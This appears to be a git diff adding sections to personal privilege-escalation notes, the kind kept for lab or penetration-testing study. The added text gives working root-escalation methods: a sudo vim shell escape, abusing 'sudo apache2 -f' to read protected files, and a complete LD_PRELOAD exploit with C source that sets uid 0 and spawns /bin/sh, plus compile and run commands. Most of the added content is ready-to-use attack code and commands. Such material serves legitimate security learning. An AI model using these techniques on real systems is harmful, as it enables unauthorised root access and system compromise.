@@ -121,13 +121,61 @@ Then, on our machine we do: ssh -oHostKeyAlgorithms=+ssh-dss -i (id_rsa file nam
 
 We will be logged in as root on another machine.
 
-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
 
 Escalation via sudo shell escaping:
 
 We can use a techinque called GTFOBins: https://gtfobins.github.io/ .
 
 Since we have access to vim without having to be root, we can use this command to have a shell as root using vim: sudo vim -c ':!/bin/sh' . And easy  as that, we now running this machine as root.
+
+----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+Escalation via intended functionality:
+
+We can use the functionality of apache2 which we can use without the root password to reveal parts of content of files that we normally dont have permission to reveal them as a regular user.
+
+sudo apache2 -f (path to the file) .
+
+
+----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+Escalation via LD_Preload:
+
+LD_PRELOAD is an environment variable used in Linux and other Unix-like systems to specify additional shared libraries that should be loaded before all other shared libraries when a program starts. This variable allows you to override or interpose certain functions within other libraries used by an application.
+
+When a program is executed, the dynamic linker/loader (ld.so) is responsible for resolving and loading the required shared libraries. By setting the LD_PRELOAD environment variable, you can specify additional libraries to be loaded before the standard libraries. This enables you to intercept and modify certain function calls made by the program.
+
+
+This is how we are going to use LD_Preload to escalate our privileges:
+
+1- We change our directory to /tmp .
+
+2- We create a C file, lets call it shell.c: nano shell.c .
+
+3-Once the file open in nano, we write the following code in it:
+#include <stdio.h>
+#include <sys/types.h>
+#include <stdlib.h>
+void _init() {
+unsetenv("LD_PRELOAD");
+setgid(0);
+setuid(0);
+system("/bin/sh");
+} .
+
+Then, we save the file.
+
+3-Since we need this c file to generate a shared object with .so extension, we compile the C file like so: gcc -fPIC -shared -o shell.so shell.c -nostartfiles . We make sure that the .so file has been generated: ls -la .
+
+4-Finally, we run the file using LD_Preload: sudo LD_PRELOAD=/tmp/shell.so find . Now, we have a shell as root .
+
+
+
+
+
+
 
 
 
